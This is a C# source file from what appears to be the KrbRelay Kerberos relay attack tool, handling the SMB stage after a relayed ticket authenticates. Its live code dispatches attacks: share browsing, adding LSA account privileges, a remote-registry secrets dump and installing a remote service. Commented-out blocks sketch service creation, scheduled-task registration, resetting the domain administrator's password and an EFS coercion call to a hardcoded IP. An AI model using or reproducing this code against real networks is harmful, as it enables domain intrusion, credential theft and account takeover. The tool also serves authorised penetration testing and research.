using System;
using System.Linq;
using static KrbRelay.Program;

namespace KrbRelay.Clients
{
    public class Smb
    {
        public static void Connect()
        {
            apRep1 = smbClient.Login(ticket, out bool success);
            if (success)
            {
                Console.WriteLine("[+] SMB session established");

                try
                {
                    if (attacks.Keys.Contains("console"))
                    {
                        Attacks.Smb.Shares.smbConsole(smbClient);
                    }
                    if (attacks.Keys.Contains("list"))
                    {
                        Attacks.Smb.Shares.listShares(smbClient);
                    }
                    if (attacks.Keys.Contains("add-privileges"))
                    {
                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
                    }
                    if (attacks.Keys.Contains("secrets"))
                    {
                        Attacks.Smb.RemoteRegistry.secretsDump(smbClient, false);
                    }
                    if (attacks.Keys.Contains("service-add"))
                    {
                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                        Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("[-] {0}", e);
                }

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, RprnService.ServicePipeName, RprnService.ServiceInterfaceGuid, RprnService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //
                //    //var hPrinter = RprnServiceHelper.rpcOpenPrinter(rpc, out status);
                //    //Console.WriteLine("rpcOpenPrinter: {0}", status);
                //
                //    //var closePrinter = RprnServiceHelper.rpcClosePrinter(rpc, hPrinter, out status);
                //    //Console.WriteLine("rpcClosePrinter: {0}", status);
                //
                //    //status = RprnServiceHelper.rpcEnumPrinterDrivers(rpc);
                //    //Console.WriteLine("rpcEnumPrinterDrivers: {0}", status);
                //
                //    //status = RprnServiceHelper.rpcAddPrinterDriverEx(rpc);
                //    //Console.WriteLine("rpcAddPrinterDriverEx: {0}", status);
                //
                //}

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, RrpService.ServicePipeName, RrpService.ServiceInterfaceGuid, RrpService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //
                //    var hKey = RrpServiceHelper.OpenLocalMachine(rpc, out status);
                //    Console.WriteLine("OpenLocalMachine: {0}", status);
                //
                //    //var bKey = RrpServiceHelper.BaseRegOpenKey(rpc, hKey, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\x00", out status);
                //    //Console.WriteLine("BaseRegOpenKey: {0}", status);
                //
                //    //var infoquery = RrpServiceHelper.baseRegQueryInfoKey(rpc, bKey, out status);
                //    //Console.WriteLine("baseRegQueryInfoKey: {0}", status);
                //    //Helpers.PrintProperties(infoquery);
                //
                //    //var keyquery = RrpServiceHelper.BaseRegQueryValue(rpc, bKey, "ProductName\x00", out status);
                //    //Console.WriteLine("BaseRegOpenKey: {0}", status);
                //    //Console.WriteLine(keyquery.data.Length);
                //    //Console.WriteLine(keyquery.regType);
                //    //Console.WriteLine(Encoding.Unicode.GetString(keyquery.data));
                //
                //    //var keyhandle = RrpServiceHelper.BaseRegCreateKey(rpc, bKey, "ProductName\x00", out status);
                //    //Console.WriteLine("BaseRegCreateKey: {0}", status);
                //
                //
                //    RrpServiceHelper.BaseRegCloseKey(rpc, hKey, out status);
                //    Console.WriteLine("BaseRegCloseKey: {0}", status);
                //    //RrpServiceHelper.BaseRegCloseKey(rpc, bKey, out status);
                //    //Console.WriteLine("BaseRegCloseKey: {0}", status);
                //}

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, ScmrService.ServicePipeName, ScmrService.ServiceInterfaceGuid, ScmrService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //
                //    var lpScHandle = ScmrServiceHelper.rOpenSCManagerW(rpc, out status);
                //    Console.WriteLine("rOpenSCManagerW: {0}", status);
                //
                //
                //    var newHandle = ScmrServiceHelper.rCreateServiceW(rpc, lpScHandle, "testservice\x00", "C:\\windows\\system32\\net.exe\x00", out status);
                //    Console.WriteLine("rCreateServiceW: {0}", status);
                //
                //
                //    //var bitsHandle = ScmrServiceHelper.rOpenServiceW(rpc, lpScHandle, "bits", out status);
                //    //Console.WriteLine("rOpenServiceW: {0}", status);
                //    //
                //    //var sBits = ScmrServiceHelper.rQueryServiceStatus(rpc, bitsHandle, out status);
                //    //Console.WriteLine("rQueryServiceStatus: {0}", status);
                //    //Helpers.PrintProperties(sBits);
                //    //
                //    //var cBits = ScmrServiceHelper.rQueryServiceConfig(rpc, bitsHandle, out status);
                //    //Console.WriteLine("rQueryServiceConfig: {0}", status);
                //    //Helpers.PrintProperties(cBits);
                //    //
                //    //status = ScmrServiceHelper.rStartServiceW(rpc, bitsHandle);
                //    //Console.WriteLine("rStartServiceW: {0}", status);
                //    //
                //    //var stop = ScmrServiceHelper.rControlService(rpc, bitsHandle, 0x00000001, out status);
                //    //Console.WriteLine("rControlService: {0}", status);
                //    //Helpers.PrintProperties(stop);
                //
                //
                //
                //    var closeHandle = ScmrServiceHelper.rCloseServiceHandle(rpc, lpScHandle, out status);
                //    Console.WriteLine("rCloseServiceHandle: {0}", status);
                //}

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, TschService.ServicePipeName, TschService.ServiceInterfaceGuid, TschService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //
                //    // Fails with RPC_C_AUTHN_LEVEL_CONNECT ?
                //    var schRpcRegisterTaskResponse = TschServiceHelper.schRpcRegisterTask(rpc, out status);
                //    Console.WriteLine("schRpcRegisterTask: {0}", status);
                //    //Console.WriteLine("schRpcRegisterTaskResponse: {0}", schRpcRegisterTaskResponse.ActualPath);
                //    //Console.WriteLine("schRpcRegisterTaskResponse: {0}", schRpcRegisterTaskResponse.ErrorInfo.value);
                //
                //    //SamprHandle domainHandle = TschServiceHelper.schRpcRun(rpc, samrHandle, AccessMask.MAXIMUM_ALLOWED, SIDHelper.CreateFromString("S-1-5-21-3913535447-1451188379-3981146038"), out status);
                //    //Console.WriteLine("schRpcRun: {0}", status);
                //
                //    //SamprHandle userHandle = TschServiceHelper.schRpcGetLastRunInfo(rpc, domainHandle, AccessMask.MAXIMUM_ALLOWED, 500, out status);
                //    //Console.WriteLine("schRpcGetLastRunInfo: {0}", status);
                //
                //    //status = TschServiceHelper.schRpcDelete(rpc, userHandle);
                //    //Console.WriteLine("schRpcDelete: {0}", status);
                //}

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, SamrService.ServicePipeName, SamrService.ServiceInterfaceGuid, SamrService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //    SamprHandle samrHandle = SamrServiceHelper.samrConnect(rpc, AccessMask.MAXIMUM_ALLOWED, out status);
                //    Console.WriteLine("samrConnect: {0}", status);
                //
                //
                //    //TODO
                //    //var domains = SamrServiceHelper.samrEnumerateDomainsInSamServer(rpc, samrHandle, 0 , 0xffffffff, out status);
                //    //Console.WriteLine("samrEnumerateDomainsInSamServer: {0}", status);
                //    //Console.WriteLine(domains.CountReturned);
                //    //Console.WriteLine(domains.EnumerationContext);
                //    //Console.WriteLine(domains.Buffer.EntriesRead);
                //    //Console.WriteLine(domains.Buffer.Buffer[0].Name.Value);
                //
                //    //TODO
                //    //var drid = SamrServiceHelper.samrLookupDomainInSamServer(rpc, samrHandle, "WIN2016", out status);
                //    //Console.WriteLine("samrLookupDomainInSamServer: {0}", status);
                //    //Console.WriteLine(drid);
                //
                //
                //    SamprHandle domainHandle = SamrServiceHelper.samrOpenDomain(rpc, samrHandle, AccessMask.MAXIMUM_ALLOWED, SIDHelper.CreateFromString("S-1-5-21-3913535447-1451188379-3981146038"), out status);
                //    Console.WriteLine("SamrOpenDomain: {0}", status);
                //
                //
                //    SamprHandle userHandle = SamrServiceHelper.samrOpenUser(rpc, domainHandle, AccessMask.MAXIMUM_ALLOWED, 500, out status); //administrator rid
                //    Console.WriteLine("samrOpenUser: {0}", status);
                //
                //    SamprHandle groupHandle = SamrServiceHelper.samrOpenGroup(rpc, domainHandle, AccessMask.MAXIMUM_ALLOWED, 0x00000201, out status); //administrators sid
                //    Console.WriteLine("samrOpenGroup: {0}", status);
                //
                //
                //    //TODO
                //    //samrCreateUserInDomainResponse newUser = SamrServiceHelper.samrCreateUserInDomain(rpc, domainHandle, "cubetest", 0x000F07FF, out status); //USER_ALL_ACCESS
                //    //Console.WriteLine("samrCreateUserInDomain: {0}", status);
                //    //Console.WriteLine(newUser.RelativeId);
                //
                //
                //    //status = SamrServiceHelper.samrAddMemberToGroup(rpc, groupHandle, 1118, 2);
                //    //Console.WriteLine("samrAddMemberToGroup: {0}", status);
                //
                //    //TODO password needs to be encrypted with SMB session key
                //    //Console.WriteLine(smb2.m_sessionKey.Length);
                //    status = SamrServiceHelper.samrSetInformationUser(rpc, userHandle, "Password123!", smb2.m_sessionKey);
                //    Console.WriteLine("samrSetInformationUser: {0}", status);
                //
                //    //status = SamrServiceHelper.samrClose(rpc, samrHandle);
                //    //Console.WriteLine("samrClose: {0}", status);
                //    //status = SamrServiceHelper.samrClose(rpc, domainHandle);
                //    //Console.WriteLine("samrClose: {0}", status);
                //    //status = SamrServiceHelper.samrClose(rpc, userHandle);
                //    //Console.WriteLine("samrClose: {0}", status);
                //    //status = SamrServiceHelper.samrClose(rpc, groupHandle);
                //    //Console.WriteLine("samrClose: {0}", status);
                //}

                //using (RPCCallHelper rpc = new RPCCallHelper(smb2, EFSService.ServicePipeName, EFSService.ServiceInterfaceGuid, EFSService.ServiceVersion))
                //{
                //    var status = rpc.BindPipe();
                //    if (status != NTStatus.STATUS_SUCCESS)
                //        return;
                //    var handle = new EXImportContextHandle();
                //    var efs = EFSServiceHelper.EfsRpcOpenFileRaw(rpc, out handle, "\\\\192.168.73.10\\test", 0, out status);
                //    Console.WriteLine("EfsRpcOpenFileRaw: {0}", efs);
                //}

                smbClient.Logoff();
                smbClient.Disconnect();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
            }
        }
    }
}